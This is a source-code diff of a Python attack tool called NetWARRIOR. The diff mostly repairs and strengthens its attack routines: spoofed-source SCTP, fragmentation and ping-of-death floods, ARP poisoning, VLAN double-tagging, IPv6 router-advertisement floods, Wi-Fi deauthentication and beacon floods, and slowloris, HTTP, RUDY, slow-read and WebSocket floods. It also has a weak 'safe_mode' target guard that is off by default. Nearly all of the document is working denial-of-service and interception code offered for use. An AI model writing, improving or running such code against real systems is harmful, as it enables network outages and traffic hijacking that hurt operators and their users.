@@ -2,46 +2,81 @@ import os
 import sys
 import time
 import socket
-import struct
 import random
+import re
 import threading
+import queue
+import shlex
+import shutil
 import subprocess
-import json
+import html
 import ipaddress
-import hashlib
-import base64
 import platform
 import collections
 import datetime
-import math
-import traceback
-import select
-import tempfile
-import itertools
 import asyncio
-import aiohttp
-import functools
-from typing import Optional, Dict, List, Tuple, Any, Callable, Iterable
+import importlib.util
+from typing import Optional, Dict, List, Iterable
 from dataclasses import dataclass, field
-from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
+from io import StringIO
+
+# ──────────────────────────────────────────────────────────────────────────────
+# DEPENDENCY CHECK
+#
+# Runs BEFORE any third-party import so a missing package produces a readable
+# message and an install hint instead of a raw ModuleNotFoundError traceback.
+# The keys are import names; the values are the pip package names (several
+# differ, e.g. the `dns` module ships in the `dnspython` package).
+# ──────────────────────────────────────────────────────────────────────────────
+_REQUIRED = {
+    "rich": "rich",
+    "scapy": "scapy",
+    "psutil": "psutil",
+    "paramiko": "paramiko",
+    "dns": "dnspython",
+    "aiohttp": "aiohttp",
+    "tomli_w": "tomli_w",
+}
+if sys.version_info < (3, 11):
+    _REQUIRED["tomli"] = "tomli"
+
+
+def check_deps():
+    missing = sorted(
+        pip_name for mod, pip_name in _REQUIRED.items()
+        if importlib.util.find_spec(mod) is None
+    )
+    if missing:
+        print("NetWARRIOR: missing dependencies -> " + ", ".join(missing))
+        print("Install them with:\n    pip install " + " ".join(missing))
+        sys.exit(1)
+
+
+check_deps()
+
+# TOML reader: stdlib tomllib on 3.11+, external tomli on older interpreters.
+try:
+    import tomllib as tomli
+except ModuleNotFoundError:  # Python < 3.11
+    import tomli
 import tomli_w
-import tomli
-import sys as _sys
+
 _UVLOOP = False
-if _sys.platform != "win32":
+if sys.platform != "win32":
     try:
         import uvloop
         _UVLOOP = True
     except ImportError:
         pass
+
+import aiohttp
 import psutil
 import paramiko
 import dns.resolver
 import dns.reversename
 import dns.zone
 import dns.query
-from io import StringIO
 
 # Rich
 from rich.console import Console, Group
@@ -51,36 +86,17 @@ from rich.layout import Layout
 from rich.live import Live
 from rich.text import Text
 from rich import box
-from rich.prompt import Prompt, Confirm
-from rich.progress import Progress, SpinnerColumn, TextColumn
-from rich.syntax import Syntax
-from rich.tree import Tree
 
 # Scapy
 from scapy.all import (
-    IP, TCP, UDP, ICMP, Ether, ARP, send, sendp, sniff, srp, sr1,
-    wrpcap, rdpcap, fragment, defragment, Dot1Q, GRE, SCTP, SCTPChunkInit,
+    IP, TCP, UDP, ICMP, Ether, ARP, send, sendp, sniff, srp, sr, sr1,
+    rdpcap, fragment, Dot1Q, GRE, SCTP, SCTPChunkInit,
     IPv6, ICMPv6ND_NA, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr,
-    IPv6ExtHdrHopByHop, DNS, DNSQR, DNSRR, RadioTap, Dot11, Dot11Deauth,
-    Dot11Beacon, Dot11Elt, LLC, Raw, EAPOL
+    DNS, DNSQR, DNSRR, RadioTap, Dot11, Dot11Deauth,
+    Dot11Beacon, Dot11Elt, LLC, Raw, EAPOL, BOOTP, DHCP,
 )
 
 console = Console()
-
-# ──────────────────────────────────────────────────────────────────────────────
-# DEPENDENCY CHECK – correct import names only
-# ──────────────────────────────────────────────────────────────────────────────
-def check_deps():
-    missing = []
-    for pkg in ["rich", "scapy", "psutil", "paramiko", "dns", "aiohttp", "tomli", "tomli_w"]:
-        try:
-            __import__(pkg)
-        except ImportError:
-            missing.append(pkg)
-    if missing:
-        console.print(f"[red]Missing: {', '.join(missing)}. Install with pip.[/]")
-        sys.exit(1)
-check_deps()
 
 # ──────────────────────────────────────────────────────────────────────────────
 # UTILITY
@@ -159,39 +175,91 @@ class Utils:
 # ──────────────────────────────────────────────────────────────────────────────
 # CONFIG & STATE
 # ──────────────────────────────────────────────────────────────────────────────
+def _config_path() -> Path:
+    """Per-user config location. Uses %APPDATA% on Windows, ~/.config elsewhere."""
+    if sys.platform == "win32":
+        base = os.environ.get("APPDATA") or (Path.home() / "AppData" / "Roaming")
+        return Path(base) / "netwarrior" / "config.toml"
+    base = os.environ.get("XDG_CONFIG_HOME") or (Path.home() / ".config")
+    return Path(base) / "netwarrior" / "config.toml"
+
+
 class Config:
+    # name -> (coercion callable, default)
+    _FIELDS = {
+        "max_pps":          (int,   10000),
+        "safe_mode":        (bool,  False),
+        "default_duration": (int,   30),
+        "interface":        (str,   None),
+        "output_dir":       (Path,  Path("reports")),
+        "log_level":        (str,   "INFO"),
+        "dns_servers":      (list,  ["8.8.8.8", "1.1.1.1"]),
+        "ssh_timeout":      (float, 5.0),
+        "http_timeout":     (float, 10.0),
+    }
+
     def __init__(self):
-        self.max_pps = 10000
-        self.safe_mode = False
-        self.default_duration = 30
-        self.interface = None
-        self.output_dir = Path("reports")
-        self.log_level = "INFO"
-        self.dns_servers = ["8.8.8.8", "1.1.1.1"]
-        self.ssh_timeout = 5.0
-        self.http_timeout = 10.0
-        self._path = Path.home() / ".config/netwarrior/config.toml"
+        for name, (_, default) in self._FIELDS.items():
+            setattr(self, name, default)
+        self._path = _config_path()
         self.load()
 
     def load(self):
-        if self._path.exists():
+        if not self._path.exists():
+            return
+        try:
+            with open(self._path, "rb") as f:
+                data = tomli.load(f)
+        except Exception as e:
+            console.print(f"[yellow]Config load failed ({e}); using defaults.[/]")
+            return
+        for k, v in data.items():
+            spec = self._FIELDS.get(k)
+            if spec is None:
+                continue
+            coerce, _ = spec
             try:
-                with open(self._path, "rb") as f:
-                    data = tomli.load(f)
-                for k, v in data.items():
-                    if hasattr(self, k):
-                        setattr(self, k, v)
-            except Exception:
-                pass
+                setattr(self, k, None if v is None else coerce(v))
+            except (TypeError, ValueError):
+                pass  # keep the default for a malformed entry
 
     def save(self):
         self._path.parent.mkdir(parents=True, exist_ok=True)
-        data = {k: v for k, v in self.__dict__.items() if not k.startswith("_")}
-        for k, v in data.items():
-            if isinstance(v, Path):
-                data[k] = str(v)
+        data = {}
+        for k in self._FIELDS:
+            v = getattr(self, k)
+            if v is None:
+                continue
+            data[k] = str(v) if isinstance(v, Path) else v
         with open(self._path, "wb") as f:
             tomli_w.dump(data, f)
+
+    # ── Safety guard ──────────────────────────────────────────────────────────
+    def clamp_pps(self, pps: int) -> int:
+        try:
+            pps = int(pps)
+        except (TypeError, ValueError):
+            pps = 1000
+        return max(1, min(pps, self.max_pps))
+
+    def check_target(self, target: str) -> Optional[str]:
+        """Return a rejection reason when safe_mode forbids this target, else None."""
+        if not self.safe_mode:
+            return None
+        host = (target or "").strip()
+        try:
+            ip = ipaddress.ip_address(host)
+        except ValueError:
+            return None  # hostnames are not resolved here; only literal IPs are gated
+        if ip.is_loopback:
+            return "safe_mode: refusing to target loopback"
+        if ip.is_multicast:
+            return "safe_mode: refusing to target a multicast address"
+        if ip.is_unspecified or ip.is_reserved:
+            return "safe_mode: refusing to target a reserved address"
+        if ip.version == 4 and ip.packed[-1] in (0, 255):
+            return "safe_mode: refusing to target a network/broadcast address"
+        return None
 
 class NetworkContext:
     def __init__(self):
@@ -267,32 +335,61 @@ class AttackState:
         with self._lock:
             self.findings.append(f)
     def stop(self):
-        self.running = False
-        self.end_time = time.time()
+        with self._lock:
+            self.running = False
+            self.end_time = time.time()
+
+    @property
+    def duration(self) -> float:
+        return (self.end_time or time.time()) - self.start_time
+
 
 class AttackRegistry:
     def __init__(self):
-        self._attacks: Dict[str, AttackState] = {}
+        self._attacks: "collections.OrderedDict[str, AttackState]" = collections.OrderedDict()
         self._lock = threading.Lock()
+
     def create(self, name) -> AttackState:
         with self._lock:
-            att = AttackState(name=name)
-            self._attacks[name] = att
+            # Keep prior runs of the same attack for the session report instead of
+            # silently overwriting them; disambiguate with a numeric suffix.
+            key = name
+            n = 2
+            while key in self._attacks:
+                key = f"{name}#{n}"
+                n += 1
+            att = AttackState(name=key)
+            self._attacks[key] = att
             return att
+
     def get(self, name):
         with self._lock:
             return self._attacks.get(name)
-    def stop_all(self):
+
+    def snapshot(self) -> "List[AttackState]":
         with self._lock:
-            for a in self._attacks.values():
-                a.stop()
+            return list(self._attacks.values())
+
+    def stop_all(self):
+        """Cooperatively stop every running attack. History is retained."""
+        for a in self.snapshot():
+            a.stop()
+
+    def clear(self):
+        with self._lock:
             self._attacks.clear()
+
     def active(self):
         with self._lock:
-            return [n for n,a in self._attacks.items() if a.running]
+            return [n for n, a in self._attacks.items() if a.running]
+
     def total_packets(self):
         with self._lock:
             return sum(a.packets_sent for a in self._attacks.values())
+
+    def total_bytes(self):
+        with self._lock:
+            return sum(a.bytes_sent for a in self._attacks.values())
 
 class LogBus:
     def __init__(self, maxlen=500):
@@ -313,27 +410,40 @@ class LogBus:
 # ──────────────────────────────────────────────────────────────────────────────
 # ENGINE
 # ──────────────────────────────────────────────────────────────────────────────
+def _safe_len(pkt) -> int:
+    try:
+        return len(bytes(pkt))
+    except Exception:
+        return 0
+
+
+def _bytelen(pkts) -> int:
+    return sum(_safe_len(p) for p in pkts)
+
+
 class RateLimiter:
-    def __init__(self, rate: int):
-        self.rate = rate
-        self.tokens = rate
+    """Async token bucket. One consumer per limiter. Starts empty (no initial burst)."""
+    def __init__(self, rate: float, burst: float = 0.0):
+        self.rate = max(0.0, float(rate))
+        # allow at most ~1s of accumulation so a stalled sender cannot bank a huge burst
+        self.capacity = max(self.rate, 1.0)
+        self.tokens = min(self.capacity, max(0.0, burst))
         self.last = asyncio.get_running_loop().time()
-        self._lock = asyncio.Lock()
+
     async def acquire(self, n=1):
         if self.rate <= 0:
             return
-        async with self._lock:
-            now = asyncio.get_running_loop().time()
-            elapsed = now - self.last
-            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
-            self.last = now
-            if self.tokens >= n:
-                self.tokens -= n
-                return
-            need = n - self.tokens
-            await asyncio.sleep(need / self.rate)
-            self.tokens = 0
-            self.last = asyncio.get_running_loop().time()
+        now = asyncio.get_running_loop().time()
+        self.tokens = min(self.capacity, self.tokens + (now - self.last) * self.rate)
+        self.last = now
+        if self.tokens >= n:
+            self.tokens -= n
+            return
+        deficit = n - self.tokens
+        self.tokens = 0
+        await asyncio.sleep(deficit / self.rate)
+        self.last = asyncio.get_running_loop().time()
+
 
 class AttackEngine:
     def __init__(self, config: Config, registry: AttackRegistry, log: LogBus, net: NetworkContext):
@@ -341,56 +451,85 @@ class AttackEngine:
         self.registry = registry
         self.log = log
         self.net = net
-        self._stop = asyncio.Event()
+        self._stop = asyncio.Event()          # global shutdown (quit only)
         self._loop = asyncio.get_running_loop()
 
     def stop(self):
+        """Global shutdown. Use registry.stop_all() to stop attacks without quitting."""
         self._stop.set()
 
-    async def send_packet(self, packet, count=1, pps=None, layer2=False, attack_name=""):
-        if pps is None:
-            pps = self.config.max_pps
-        limiter = RateLimiter(pps)
-        sent = 0
-        for _ in range(count):
-            if self._stop.is_set():
-                break
-            await limiter.acquire(1)
-            try:
-                if layer2:
-                    sendp(packet, verbose=0)
-                else:
-                    send(packet, verbose=0)
-                sent += 1
-            except Exception:
-                if attack_name:
-                    att = self.registry.get(attack_name)
-                    if att:
-                        att.inc_errors()
-        if attack_name:
-            att = self.registry.get(attack_name)
-            if att:
-                att.inc_sent(sent)
-        return sent
+    def _resolve_iface(self, iface: Optional[str]) -> Optional[str]:
+        return iface or self.config.interface or None
 
     async def send_loop(self, packet_gen: Iterable, duration: float, pps: int,
-                        attack_name: str, layer2: bool = False):
+                        attack_name: str, layer2: bool = False,
+                        iface: Optional[str] = None):
+        """
+        Pull packets from `packet_gen` and transmit them at `pps` for `duration`
+        seconds. Transmission is dispatched to a worker thread in small batches so
+        the asyncio event loop (and therefore the UI and the stop command) stays
+        responsive even at high packet rates.
+        """
+        pps = self.config.clamp_pps(pps)
         limiter = RateLimiter(pps)
-        deadline = asyncio.get_running_loop().time() + duration
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + max(0, duration)
         att = self.registry.get(attack_name)
-        for pkt in packet_gen:
-            if self._stop.is_set() or not att or not att.running or asyncio.get_running_loop().time() >= deadline:
-                break
-            await limiter.acquire(1)
+        if att is None:
+            return
+        iface = self._resolve_iface(iface)
+        # ~20 executor hand-offs per second keeps the loop responsive.
+        batch_size = max(1, min(int(pps // 20) or 1, 512))
+        gen = iter(packet_gen)
+
+        def _flush(pkts):
+            fn = sendp if layer2 else send
             try:
-                if layer2:
-                    sendp(pkt, verbose=0)
-                else:
-                    send(pkt, verbose=0)
-                att.inc_sent(1)
+                fn(pkts, verbose=0, iface=iface)
+                return len(pkts), _bytelen(pkts), 0
             except Exception:
-                att.inc_errors()
-        if att:
+                ok = nbytes = err = 0
+                for p in pkts:
+                    try:
+                        fn(p, verbose=0, iface=iface)
+                        ok += 1
+                        nbytes += _safe_len(p)
+                    except Exception:
+                        err += 1
+                return ok, nbytes, err
+
+        try:
+            while att.running and not self._stop.is_set() and loop.time() < deadline:
+                batch = []
+                stop = False
+                for _ in range(batch_size):
+                    try:
+                        batch.append(next(gen))
+                    except StopIteration:
+                        stop = True
+                        break
+                    except Exception as e:
+                        # a raised generator is dead; report and end the attack
+                        self.log.add(f"{attack_name}: cannot build packet ({e})",
+                                     level="error")
+                        att.inc_errors()
+                        stop = True
+                        break
+                if batch:
+                    await limiter.acquire(len(batch))
+                    try:
+                        sent, nbytes, errs = await loop.run_in_executor(None, _flush, batch)
+                    except Exception as e:
+                        self.log.add(f"{attack_name}: send failed ({e})", level="error")
+                        att.inc_errors(len(batch))
+                        break
+                    att.inc_sent(sent)
+                    att.inc_bytes_sent(nbytes)
+                    if errs:
+                        att.inc_errors(errs)
+                if stop:
+                    break
+        finally:
             att.stop()
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -562,9 +701,10 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=Utils.rand_ip(), dst=target) / SCTP(
-                    sport=Utils.rand_port(), dport=port, tag=Utils.rand_port()
-                ) / SCTPChunkInit(init_tag=Utils.rand_port(), a_rwnd=65535,
-                                  num_outbound=1, num_inbound=1, init_tsn=Utils.rand_port())
+                    sport=Utils.rand_port(), dport=port, tag=0
+                ) / SCTPChunkInit(init_tag=random.randint(1, 0xFFFFFFFF), a_rwnd=65535,
+                                  n_out_streams=10, n_in_streams=10,
+                                  init_tsn=random.randint(0, 0xFFFFFFFF))
         await self.engine.send_loop(gen(), duration, pps, name)
         return att
 
@@ -574,11 +714,10 @@ class Attacks:
         self.log.add(f"Teardrop {target} @ {pps} pps", tag="ATTACK")
         def gen():
             while True:
-                ip = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1,65535))
+                ip = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1, 65535))
                 pkt = ip / Utils.rand_payload(2000)
-                frags = fragment(pkt, fragsize=500)
-                for f in frags:
-                    yield f
+                # fragsize must be a multiple of 8 or scapy emits malformed offsets
+                yield from fragment(pkt, fragsize=488)
         await self.engine.send_loop(gen(), duration, pps, name)
         return att
 
@@ -588,7 +727,12 @@ class Attacks:
         self.log.add(f"Ping of Death {target} @ {pps} pps", tag="ATTACK")
         def gen():
             while True:
-                yield IP(src=Utils.rand_ip(), dst=target) / ICMP() / Utils.rand_payload(65535)
+                # 65507 is the largest ICMP echo payload that still yields a legal
+                # 65535-byte datagram; anything larger cannot be built at all and
+                # just raised on every send. Fragment it for delivery.
+                pkt = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1, 65535)) / \
+                      ICMP() / Utils.rand_payload(65507)
+                yield from fragment(pkt, fragsize=1480)
         await self.engine.send_loop(gen(), duration, pps, name)
         return att
 
@@ -701,10 +845,14 @@ class Attacks:
         name = f"arp_poison_{target}"
         att = self.registry.create(name)
         self.log.add(f"ARP poison {target} <-> {gateway}", tag="MITM")
-        target_mac = Utils.get_mac(target)
-        gw_mac = Utils.get_mac(gateway)
+        loop = asyncio.get_running_loop()
+        target_mac, gw_mac = await asyncio.gather(
+            loop.run_in_executor(None, Utils.get_mac, target),
+            loop.run_in_executor(None, Utils.get_mac, gateway),
+        )
         if not target_mac or not gw_mac:
-            self.log.add("Could not get MACs", level="error")
+            self.log.add(f"ARP poison aborted: could not resolve MAC for "
+                         f"{target if not target_mac else gateway}", level="error")
             att.stop()
             return att
         def gen():
@@ -716,13 +864,19 @@ class Attacks:
         await self.engine.send_loop(gen(), duration, 10, name, layer2=True)
         return att
 
-    async def vlan_double_tag(self, target, target_vlan=10, duration=30, pps=1000, **kwargs):
+    async def vlan_double_tag(self, target, target_vlan=10, native_vlan=1,
+                              duration=30, pps=1000, **kwargs):
         name = f"vlan_{target}_{target_vlan}"
         att = self.registry.create(name)
-        self.log.add(f"VLAN double-tag {target} VLAN {target_vlan}", tag="L2")
+        self.log.add(f"VLAN double-tag {target} (native {native_vlan} -> {target_vlan})", tag="L2")
+        src_mac = self.net.mac
         def gen():
             while True:
-                yield Ether() / Dot1Q(vlan=1) / Dot1Q(vlan=target_vlan) / IP(dst=target) / TCP(dport=80, flags="S")
+                yield (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
+                       Dot1Q(vlan=native_vlan) / Dot1Q(vlan=target_vlan) /
+                       IP(src=self.net.ip, dst=target) /
+                       TCP(sport=Utils.rand_port(), dport=80, flags="S",
+                           seq=random.randint(0, 4294967295)))
         await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
         return att
 
@@ -751,7 +905,11 @@ class Attacks:
         self.log.add(f"IPv6 RA flood {target}", tag="IPV6")
         def gen():
             while True:
-                yield IPv6(dst="ff02::1") / ICMPv6ND_RA(R=0, S=1, O=1, lifetime=9000, retranstimer=1000) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
+                # RA flags are M/O (managed/other-config); lifetime field is
+                # `routerlifetime`. R/S/O and `lifetime` are NA/other-message fields.
+                yield (IPv6(dst="ff02::1") /
+                       ICMPv6ND_RA(M=1, O=1, routerlifetime=9000, retranstimer=1000) /
+                       ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac()))
         await self.engine.send_loop(gen(), duration, pps, name)
         return att
 
@@ -776,27 +934,29 @@ class Attacks:
         return att
 
     # ---- Wireless ----
-    async def deauth(self, bssid, client="ff:ff:ff:ff:ff:ff", iface="wlan0mon", duration=30, **kwargs):
+    async def deauth(self, bssid, client="ff:ff:ff:ff:ff:ff", iface="wlan0mon", duration=30, pps=100, **kwargs):
         name = f"deauth_{bssid}"
         att = self.registry.create(name)
-        self.log.add(f"Deauth {bssid} -> {client}", tag="WIFI")
+        self.log.add(f"Deauth {bssid} -> {client} on {iface}", tag="WIFI")
         def gen():
             while True:
+                # deauth from AP to client, and from client to AP
                 yield RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
-        await self.engine.send_loop(gen(), duration, 100, name, layer2=True)
+                yield RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
+        await self.engine.send_loop(gen(), duration, pps, name, layer2=True, iface=iface)
         return att
 
-    async def beacon_flood(self, ssids=None, iface="wlan0mon", duration=30, **kwargs):
+    async def beacon_flood(self, ssids=None, iface="wlan0mon", duration=30, pps=100, **kwargs):
         if ssids is None:
             ssids = ["FreeWiFi","Guest","Public","NetWARRIOR","Open","SecureNet"]
         name = "beacon_flood"
         att = self.registry.create(name)
-        self.log.add(f"Beacon flood {len(ssids)} SSIDs", tag="WIFI")
+        self.log.add(f"Beacon flood {len(ssids)} SSIDs on {iface}", tag="WIFI")
         def gen():
             while True:
                 for ssid in ssids:
                     yield RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=Utils.rand_mac(), addr3=Utils.rand_mac()) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=ssid.encode())
-        await self.engine.send_loop(gen(), duration, 100, name, layer2=True)
+        await self.engine.send_loop(gen(), duration, pps, name, layer2=True, iface=iface)
         return att
 
     # ---- GRE ----
@@ -836,88 +996,122 @@ class Attacks:
         return att
 
     # ---- Application Layer ----
-    async def slowloris(self, target, port=80, socket_count=200, duration=30, **kwargs):
+    async def _sleep(self, att, seconds, step=1.0):
+        """Sleep that returns early when the attack is stopped."""
+        loop = asyncio.get_running_loop()
+        end = loop.time() + seconds
+        while att.running and not self.engine._stop.is_set():
+            remaining = end - loop.time()
+            if remaining <= 0:
+                break
+            await asyncio.sleep(min(step, remaining))
+
+    async def _open(self, target, port):
+        return await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
+
+    async def slowloris(self, target, port=80, socket_count=200, duration=30, keepalive=10, **kwargs):
         name = f"slowloris_{target}_{port}"
         att = self.registry.create(name)
         self.log.add(f"Slowloris {target}:{port} with {socket_count} sockets", tag="APP")
+        header = (
+            f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
+            f"Host: {target}\r\n"
+            f"User-Agent: Mozilla/5.0\r\n"
+            f"Accept-language: en-US\r\n"
+        )
         sockets = []
-        deadline = asyncio.get_running_loop().time() + duration
-        for _ in range(socket_count):
-            try:
-                reader, writer = await asyncio.open_connection(target, port)
-                writer.write(
-                    f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
-                    f"Host: {target}\r\n"
-                    f"User-Agent: Mozilla/5.0\r\n"
-                    f"Accept-language: en-US\r\n"
-                .encode())
-                await writer.drain()
-                sockets.append(writer)
-                att.inc_sent(1)
-            except Exception:
-                pass
-        while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
-            for writer in sockets[:]:
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
+        try:
+            for _ in range(socket_count):
                 try:
-                    writer.write(f"X-a: {random.randint(1,5000)}\r\n".encode())
+                    _, writer = await self._open(target, port)
+                    writer.write(header.encode())
                     await writer.drain()
+                    sockets.append(writer)
                     att.inc_sent(1)
                 except Exception:
-                    sockets.remove(writer)
-                    try: writer.close()
-                    except Exception: pass
-            await asyncio.sleep(15)
-        for writer in sockets:
-            try: writer.close()
-            except Exception: pass
-        att.stop()
+                    att.inc_errors()
+            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
+                for writer in sockets[:]:
+                    try:
+                        writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                        await writer.drain()
+                        att.inc_sent(1)
+                    except Exception:
+                        sockets.remove(writer)
+                        try:
+                            writer.close()
+                        except Exception:
+                            pass
+                # top the pool back up as the server drops connections
+                while len(sockets) < socket_count and att.running and loop.time() < deadline:
+                    try:
+                        _, writer = await self._open(target, port)
+                        writer.write(header.encode())
+                        await writer.drain()
+                        sockets.append(writer)
+                    except Exception:
+                        break
+                await self._sleep(att, keepalive)
+        finally:
+            for writer in sockets:
+                try:
+                    writer.close()
+                except Exception:
+                    pass
+            att.stop()
         return att
 
     async def http_flood(self, target, port=80, threads=20, duration=30, **kwargs):
         name = f"http_flood_{target}_{port}"
         att = self.registry.create(name)
-        self.log.add(f"HTTP flood {target}:{port} with {threads} threads", tag="APP")
-        urls = ["/","/index.html","/login","/api","/search?q=test","/about","/contact"]
+        self.log.add(f"HTTP flood {target}:{port} with {threads} workers", tag="APP")
+        urls = ["/", "/index.html", "/login", "/api", "/search?q=test", "/about", "/contact"]
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
+        timeout = aiohttp.ClientTimeout(total=5)
+
         async def worker():
-            async with aiohttp.ClientSession() as session:
-                while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                     try:
                         url = f"http://{target}:{port}{random.choice(urls)}"
-                        async with session.get(url, timeout=5) as resp:
+                        async with session.get(url) as resp:
                             await resp.read()
                         att.inc_sent(1)
                     except Exception:
-                        pass
-        deadline = asyncio.get_running_loop().time() + duration
-        tasks = [asyncio.create_task(worker()) for _ in range(threads)]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        att.stop()
+                        att.inc_errors()
+        try:
+            await asyncio.gather(*[worker() for _ in range(threads)], return_exceptions=True)
+        finally:
+            att.stop()
         return att
 
     async def rudy_attack(self, target, port=80, duration=30, sockets=20, **kwargs):
-        name = "rudy"
+        name = f"rudy_{target}_{port}"
         att = self.registry.create(name)
         url = f"http://{target}:{port}/"
         self.log.add(f"RUDY attack {url}", tag="APP")
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
+        timeout = aiohttp.ClientTimeout(total=10)
+
         async def worker():
-            async with aiohttp.ClientSession() as session:
-                try:
-                    await session.get(url, timeout=5)
-                except Exception:
-                    pass
+            async with aiohttp.ClientSession(timeout=timeout) as session:
                 data = {"username": ""}
-                while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
+                while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                     try:
-                        async with session.post(url, data=data, timeout=10) as resp:
+                        async with session.post(url, data=data) as resp:
                             await resp.content.read(1)
-                            await asyncio.sleep(10)
                         att.inc_sent(1)
                     except Exception:
-                        pass
-        deadline = asyncio.get_running_loop().time() + duration
-        tasks = [asyncio.create_task(worker()) for _ in range(sockets)]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        att.stop()
+                        att.inc_errors()
+                    await self._sleep(att, 10)
+        try:
+            await asyncio.gather(*[worker() for _ in range(sockets)], return_exceptions=True)
+        finally:
+            att.stop()
         return att
 
     async def slow_read(self, target, port=80, duration=30, sockets=20, **kwargs):
@@ -925,73 +1119,87 @@ class Attacks:
         att = self.registry.create(name)
         self.log.add(f"Slow Read {target}:{port}", tag="APP")
         socks = []
-        for _ in range(sockets):
-            try:
-                reader, writer = await asyncio.open_connection(target, port)
-                writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
-                await writer.drain()
-                socks.append(writer)
-            except Exception:
-                pass
-        deadline = asyncio.get_running_loop().time() + duration
-        while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
-            for writer in socks[:]:
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
+        try:
+            for _ in range(sockets):
                 try:
-                    writer.write(b"\x00")
+                    _, writer = await self._open(target, port)
+                    writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                     await writer.drain()
-                    att.inc_sent(1)
+                    socks.append(writer)
                 except Exception:
-                    socks.remove(writer)
-            await asyncio.sleep(5)
-        for writer in socks:
-            try: writer.close()
-            except Exception: pass
-        att.stop()
+                    att.inc_errors()
+            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
+                for writer in socks[:]:
+                    try:
+                        writer.write(b"\x00")
+                        await writer.drain()
+                        att.inc_sent(1)
+                    except Exception:
+                        socks.remove(writer)
+                await self._sleep(att, 5)
+        finally:
+            for writer in socks:
+                try:
+                    writer.close()
+                except Exception:
+                    pass
+            att.stop()
         return att
 
     async def http2_rapid_reset(self, target, port=80, duration=30, **kwargs):
-        name = "http2_reset"
+        name = f"http2_reset_{target}_{port}"
         att = self.registry.create(name)
         url = f"http://{target}:{port}/"
         self.log.add(f"HTTP/2 rapid reset {url}", tag="APP")
-        async with aiohttp.ClientSession() as session:
-            deadline = asyncio.get_running_loop().time() + duration
-            while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
-                try:
-                    async with session.get(url, timeout=2) as resp:
-                        await resp.read()
-                    att.inc_sent(1)
-                except Exception:
-                    pass
-                await asyncio.sleep(0.01)
-        att.stop()
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
+        timeout = aiohttp.ClientTimeout(total=2)
+        try:
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
+                    try:
+                        async with session.get(url) as resp:
+                            await resp.read()
+                        att.inc_sent(1)
+                    except Exception:
+                        att.inc_errors()
+                    await asyncio.sleep(0.01)
+        finally:
+            att.stop()
         return att
 
     async def websocket_flood(self, target, port=80, duration=30, sockets=20, **kwargs):
-        name = "websocket_flood"
+        name = f"websocket_flood_{target}_{port}"
         att = self.registry.create(name)
         ws_url = f"ws://{target}:{port}/"
         self.log.add(f"WebSocket flood {ws_url}", tag="APP")
+        req = (
+            f"GET / HTTP/1.1\r\nHost: {target}\r\nUpgrade: websocket\r\n"
+            f"Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+            f"Sec-WebSocket-Version: 13\r\n\r\n"
+        ).encode()
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + duration
+
         async def worker():
             try:
-                reader, writer = await asyncio.open_connection(target, port)
-                req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"
-                writer.write(req.encode())
+                _, writer = await self._open(target, port)
+                writer.write(req)
                 await writer.drain()
-                await asyncio.sleep(2)
+                await self._sleep(att, 2)
                 writer.close()
                 await writer.wait_closed()
                 att.inc_sent(1)
             except Exception:
-                pass
-        deadline = asyncio.get_running_loop().time() + duration
-        tasks = []
-        while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
-            for _ in range(sockets):
-                tasks.append(asyncio.create_task(worker()))
-            await asyncio.sleep(0.1)
-        await asyncio.gather(*tasks, return_exceptions=True)
-        att.stop()
+                att.inc_errors()
+        try:
+            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
+                # one bounded wave at a time so tasks and fds do not pile up
+                await asyncio.gather(*[worker() for _ in range(sockets)], return_exceptions=True)
+        finally:
+            att.stop()
         return att
 
     # ---- Responder-style Poisoning ----
@@ -1037,99 +1245,130 @@ class Attacks:
         return att
